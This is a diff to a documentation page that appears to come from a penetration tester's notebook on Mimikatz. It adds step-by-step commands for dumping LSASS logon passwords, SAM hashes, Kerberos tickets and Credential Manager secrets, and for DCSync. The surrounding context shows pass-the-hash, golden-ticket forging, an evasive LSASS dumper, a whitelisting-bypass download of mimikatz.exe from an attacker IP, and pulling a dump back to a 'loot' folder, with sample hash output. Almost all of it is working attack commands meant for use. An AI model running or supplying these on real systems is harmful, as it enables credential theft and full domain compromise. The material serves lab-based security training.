@@ -9,6 +9,97 @@ hideFooterPagination: true
 
 {/* Generated from Commands/mimikatz.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## Mimikatz: choose the operation and read the result
+
+Inspect Windows logon credentials, local account hashes, and Kerberos tickets. Plaintext passwords are not guaranteed.
+
+### What the result establishes
+
+Read the selected logon session, credential type and privileges; distinguish ticket material from passwords and NT hashes.
+
+### Prerequisites and common failures
+
+An elevated token is not enough for every operation; protected processes, Credential Guard and available privileges can restrict readable material.
+
+Run an elevated build matching the target architecture. LSASS access needs suitable privileges; local admin does not bypass LSA protection or Credential Guard.
+
+### Example 1: Start
+
+Run in: **Windows PowerShell**. Run subsequent blocks at the mimikatz # prompt; do not type that prompt.
+
+```powershell
+.\mimikatz.exe
+```
+
+### Example 2: Read logon credentials
+
+Run in: **Mimikatz prompt**. A successful debug request reports Privilege 20 OK. Password (null) can be normal; check the WDigest guide below.
+
+```text
+privilege::debug
+sekurlsa::logonpasswords
+```
+
+### Example 3: Local SAM hashes
+
+Run in: **Mimikatz prompt — SYSTEM context**. Local accounts only. Access denied means the current context cannot read the protected SAM.
+
+```text
+lsadump::sam
+```
+
+### Example 4: Kerberos keys and tickets
+
+Run in: **Mimikatz prompt**. Exports .kirbi files into the current directory.
+
+```text
+sekurlsa::ekeys
+sekurlsa::tickets /export
+```
+
+### Example 5: Credential Manager
+
+Run in: **Mimikatz prompt**.
+
+```text
+sekurlsa::credman
+```
+
+### Example 6: DCSync one domain account
+
+Run in: **Mimikatz prompt**. Requires directory replication rights and a reachable DC; local administrator alone is insufficient.
+
+```text
+lsadump::dcsync /domain:DOMAIN_FQDN /user:DOMAIN\USER
+```
+
+### Example 7: Local credential dumping
+
+Run in: **Saved lab example**.
+
+```bash
+# from SAM (local accounts) + LSA
+secretsdump.py -sam sam.save -system system.save LOCAL
+nxc smb $IP -u admin -H <hash> --sam --lsa
+# Windows, in memory
+mimikatz # sekurlsa::logonpasswords
+mimikatz # lsadump::sam
+```
+
+Saved context: [DCSync and Credential Dumping: Quick Reference — Local credential dumping](/active-directory/dcsync-credential-dumping#local-credential-dumping). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+**Password : (null)** — The session may not contain a reusable plaintext password. WDigest caching is disabled by default on modern Windows. Open WDigest below; enabling it only affects subsequent applicable logons, not existing credentials.
+
+**Privilege not held / access denied** — Confirm an elevated token and target architecture. LSA protection and Credential Guard can still block access; enabling WDigest does not disable either protection.
+
+**No expected user or empty Kerberos data** — Check which users actually authenticated to this host and how. A network logon need not leave the same credentials as an interactive logon.
+
+**Command not found** — Use sekurlsa::logonpasswords, not sekursa::logonpasswords. Run it inside Mimikatz, not directly in PowerShell.
+
+## Saved commands and notebook recipes
+
+Inspect Windows logon credentials, local account hashes, and Kerberos tickets. Plaintext passwords are not guaranteed.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=mimikatz) · [All tools](/index)
@@ -109,6 +200,13 @@ lsadump::secrets                :: LSA secrets (service account passwords)
 lsadump::cachedump              :: cached domain logons
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — 9. Credential dumping](/cheatsheets/ad-attack-path-worked-example#9-credential-dumping)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="🗺️ The kill chain (this assessment)">
@@ -141,6 +239,13 @@ DCSync against DC01
 FULL DOMAIN COMPROMISE
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — 🗺️ The kill chain (this assessment)](/cheatsheets/ad-attack-path-worked-example#-the-kill-chain-this-assessment)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Creating a Golden Ticket with Mimikatz">
@@ -171,6 +276,13 @@ Lifetime  : 3/28/2022 7:59:50 PM ; 3/25/2032 7:59:50 PM ; 3/25/2032 7:59:50 PM
 
 Golden ticket for 'hacker @ LOGISTICS.INLANEFREIGHT.LOCAL' successfully submitted for current session
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Child to Parent Trusts - Windows — Creating a Golden Ticket with Mimikatz](/active-directory/trusts-child-parent-windows#creating-a-golden-ticket-with-mimikatz)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -205,6 +317,13 @@ Credentials:
     ntlm- 0: 9d765b482771505cbe97411065964d5f
     lm  - 0: 69df324191d4a80f0ed100c10f20561e
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Child to Parent Trusts - Windows — Obtaining the KRBTGT Account's NT Hash using Mimikatz](/active-directory/trusts-child-parent-windows#obtaining-the-krbtgt-accounts-nt-hash-using-mimikatz)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -250,6 +369,13 @@ Credentials:
     lm  - 0: 6053227db44e996fe16b107d9d1e95a0
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Child to Parent Trusts - Windows — Performing a DCSync Attack](/active-directory/trusts-child-parent-windows#performing-a-dcsync-attack)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Child to Parent Trusts - Windows**
 
 ```powershell
@@ -279,6 +405,13 @@ Credentials:
     ntlm- 1: 663715a1a8b957e8e9943cc98ea451b6
     lm  - 0: 6053227db44e996fe16b107d9d1e95a0
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Child to Parent Trusts - Windows — Performing a DCSync Attack](/active-directory/trusts-child-parent-windows#performing-a-dcsync-attack)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -331,6 +464,13 @@ Supplemental Credentials:
 <SNIP>
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [DCSync Lab — Performing the Attack with Mimikatz](/active-directory/dcsync-lab#performing-the-attack-with-mimikatz)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Local credential dumping">
@@ -348,6 +488,13 @@ mimikatz # sekurlsa::logonpasswords
 mimikatz # lsadump::sam
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [DCSync and Credential Dumping: Quick Reference — Example 2: Local credential dumping](/active-directory/dcsync-credential-dumping#example-2-local-credential-dumping) · [DCSync and Credential Dumping: Quick Reference — Local credential dumping](/active-directory/dcsync-credential-dumping#local-credential-dumping) · [Impacket: Script Quick Reference — Example 2: Local credential dumping](/tools/impacket#example-2-local-credential-dumping)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Using Obscure LOLBins to Bypass Application Whitelisting">
@@ -359,6 +506,13 @@ mimikatz # lsadump::sam
 ```powershell
 GfxDownloadWrapper.exe "http://<IP>/mimikatz.exe" "C:\Temp\file.exe"
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Transfers for Linux and Windows — Using Obscure LOLBins to Bypass Application Whitelisting](/post-exploitation/file-transfers-cheat-sheet#using-obscure-lolbins-to-bypass-application-whitelisting)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -373,6 +527,13 @@ base64 /out:true
 kerberos::list /export
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Kerberoasting from Windows — 4. Export Cached Tickets with Mimikatz](/active-directory/kerberoasting-windows#4-export-cached-tickets-with-mimikatz)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Kerberoasting from Windows**
 
 Context from the notebook: With Base64 output enabled, Mimikatz prints each exported ticket as a Base64 blob. Without it,  kerberos::list /export  writes  .kirbi  files to disk.
@@ -380,6 +541,13 @@ Context from the notebook: With Base64 output enabled, Mimikatz prints each expo
 ```text
 kerberos::list /export
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Kerberoasting from Windows — 4. Export Cached Tickets with Mimikatz](/active-directory/kerberoasting-windows#4-export-cached-tickets-with-mimikatz)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -644,6 +812,13 @@ mimikatz(commandline) # exit
 Bye!
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Kerberos Double Hop — Background](/active-directory/kerberos-double-hop#background)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Prerequisites — getting the hash">
@@ -655,6 +830,13 @@ Bye!
 ```cmd
 sekurlsa::logonpasswords
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pass the Hash from Linux and Windows — Prerequisites — getting the hash](/password-attacks/pass-the-hash#prerequisites-—-getting-the-hash)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -668,6 +850,13 @@ sekurlsa::logonpasswords
 mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pass the Hash from Linux and Windows — Windows — Mimikatz (sekurlsa::pth)](/password-attacks/pass-the-hash#windows-—-mimikatz-sekurlsapth)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Mimikatz — export tickets to disk">
@@ -679,6 +868,13 @@ mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06
 ```cmd
 sekurlsa::tickets /export
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pass the Ticket from Windows — Mimikatz — export tickets to disk](/password-attacks/pass-the-ticket-from-windows#mimikatz-—-export-tickets-to-disk) · [Pass the Ticket from Windows — Key Takeaways](/password-attacks/pass-the-ticket-from-windows#key-takeaways)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -692,11 +888,25 @@ sekurlsa::tickets /export
 sekurlsa::ekeys
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pass the Ticket from Windows — Step 2a — OverPass-the-Hash / Pass the Key (forge a TGT from a key)](/password-attacks/pass-the-ticket-from-windows#step-2a-—-overpass-the-hash-/-pass-the-key-forge-a-tgt-from-a-key)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Pass the Ticket from Windows**
 
 ```cmd
 sekurlsa::pth /domain:inlanefreight.htb /user:julio /ntlm:64f12cddaa88057e06a81b54e73b949b
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pass the Ticket from Windows — Step 2a — OverPass-the-Hash / Pass the Key (forge a TGT from a key)](/password-attacks/pass-the-ticket-from-windows#step-2a-—-overpass-the-hash-/-pass-the-key-forge-a-tgt-from-a-key)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -709,6 +919,13 @@ sekurlsa::pth /domain:inlanefreight.htb /user:julio /ntlm:64f12cddaa88057e06a81b
 ```cmd
 kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pass the Ticket from Windows — Step 2b — Inject a stolen/forged ticket (the actual "pass")](/password-attacks/pass-the-ticket-from-windows#step-2b-—-inject-a-stolen/forged-ticket-the-actual-pass)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -729,6 +946,13 @@ PS C:\tools> Enter-PSSession -ComputerName DC01
 inlanefreight\john
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pass the Ticket from Windows — Step 3 — Use the ticket (lateral movement)](/password-attacks/pass-the-ticket-from-windows#step-3-—-use-the-ticket-lateral-movement)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="13. Attacking Windows Credential Manager">
@@ -742,6 +966,13 @@ mimikatz.exe
 privilege::debug
 sekurlsa::credman
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Password Attacks: Cracking, Files, and Credential Stores — 13. Attacking Windows Credential Manager](/password-attacks/password-attacks-cheat-sheet#13-attacking-windows-credential-manager)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -760,6 +991,13 @@ sekurlsa::ekeys                  :: Kerberos encryption keys (for PtT)
 sekurlsa::tickets /export        :: export .kirbi tickets
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Post-Exploitation: Field Reference — 1. LSASS — the credential goldmine](/cheatsheets/windows-post-exploitation#1-lsass-—-the-credential-goldmine)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Windows Post-Exploitation: Field Reference**
 
 ```cmd
@@ -769,6 +1007,13 @@ nanodump.exe --write C:\Windows\Temp\l.dmp        :: alternative, evasive dumper
 :: on Kali:
 pypykatz lsa minidump l.dmp
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Post-Exploitation: Field Reference — 1. LSASS — the credential goldmine](/cheatsheets/windows-post-exploitation#1-lsass-—-the-credential-goldmine)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -786,6 +1031,13 @@ mimikatz # lsadump::cachedump      :: cached domain logons (crackable as $DCC2$)
 impacket-secretsdump 'domain/user:pass'@<host>
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Post-Exploitation: Field Reference — 2. SAM / LSA secrets / cached (local + service creds)](/cheatsheets/windows-post-exploitation#2-sam-/-lsa-secrets-/-cached-local-+-service-creds) · [Impacket: Script Quick Reference — Example 7: 2. SAM / LSA secrets / cached (local + service creds)](/tools/impacket#example-7-2-sam-/-lsa-secrets-/-cached-local-+-service-creds)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="3. DCSync (Domain Admin → any hash, no host access)">
@@ -800,6 +1052,13 @@ impacket-secretsdump 'domain/DA_user:pass'@<DC> -just-dc-user krbtgt    # Golden
 mimikatz # lsadump::dcsync /domain:nexura.htb /user:Administrator
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Post-Exploitation: Field Reference — 3. DCSync (Domain Admin → any hash, no host access)](/cheatsheets/windows-post-exploitation#3-dcsync-domain-admin-→-any-hash-no-host-access) · [Impacket: Script Quick Reference — Example 4: 3. DCSync (Domain Admin → any hash, no host access)](/tools/impacket#example-4-3-dcsync-domain-admin-→-any-hash-no-host-access)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="4. DPAPI / browsers / app creds">
@@ -813,6 +1072,13 @@ mimikatz # dpapi::cred             :: decrypt stored credentials
 LaZagne.exe all                    :: browsers, wifi, RDP, email, etc. (STANDALONE .EXE, no Python)
 :: SharpChrome / SharpDPAPI for browser cookies + saved logins
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Post-Exploitation: Field Reference — 4. DPAPI / browsers / app creds](/cheatsheets/windows-post-exploitation#4-dpapi-/-browsers-/-app-creds)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -830,6 +1096,13 @@ powershell -c "Invoke-WebRequest http://172.16.119.13:8080/mimikatz.exe -OutFile
 :: PULL a file back to Kali over your session:
 *Evil-WinRM* PS> download C:\Temp\l.dmp /home/kali/loot/
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Post-Exploitation: Field Reference — Transfer (full detail in the Pivoting cheatsheet)](/cheatsheets/windows-post-exploitation#transfer-full-detail-in-the-pivoting-cheatsheet)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -852,6 +1125,13 @@ mimikatz> lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\W
 mimikatz> lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — HiveNightmare](/privesc/windows-privesc-checklist#hivenightmare)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="A. You&#x27;re admin but UAC‑filtered (medium integrity)">
@@ -865,6 +1145,13 @@ Context from the notebook: Symptom:  mimikatz # privilege::debug  →  ERROR ...
 ```text
 mimikatz # privilege::debug
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — A. You're admin but UAC‑filtered (medium integrity)](/cheatsheets/ad-attack-path-worked-example#a-you-re-admin-but-uac‑filtered-medium-integrity)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -880,6 +1167,13 @@ Context from the notebook: mimikatz privilege::debug  →  c0000061 Not elevated
 mimikatz privilege::debug
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — 🚨 GLOBAL CAVEATS (the stuff that wasted hours)](/cheatsheets/ad-attack-path-worked-example#-global-caveats-the-stuff-that-wasted-hours) · [Windows Post-Exploitation: Field Reference — F. UAC bypass (admin but Medium integrity)](/cheatsheets/windows-post-exploitation#f-uac-bypass-admin-but-medium-integrity)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Defender / AMSI">
@@ -893,6 +1187,13 @@ Context from the notebook: Defender will flag  mimikatz.exe ,  winPEAS.exe , etc
 ```text
 mimikatz.exe
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Post-Exploitation: Field Reference — Defender / AMSI](/cheatsheets/windows-post-exploitation#defender-/-amsi)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -938,6 +1239,13 @@ Credentials:
     lm  - 0: 4562458c201a97fa19365ce901513c21
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Historical AD Vulnerability Labs — Performing DCSync with Mimikatz](/active-directory/historical-vulnerability-labs#performing-dcsync-with-mimikatz)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
@@ -945,3 +1253,14 @@ Credentials:
 ## Related tools and references
 
 - [WDigest — plaintext missing](/commands/wdigest)
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [WDigest — plaintext missing](/commands/wdigest)
+- [DCSync and Credential Dumping: Quick Reference](/active-directory/dcsync-credential-dumping)
+- [Pass the Ticket from Windows](/password-attacks/pass-the-ticket-from-windows)
+- [Pass the Hash from Linux and Windows](/password-attacks/pass-the-hash)
+
+{/* VAULT_RELATED_END */}
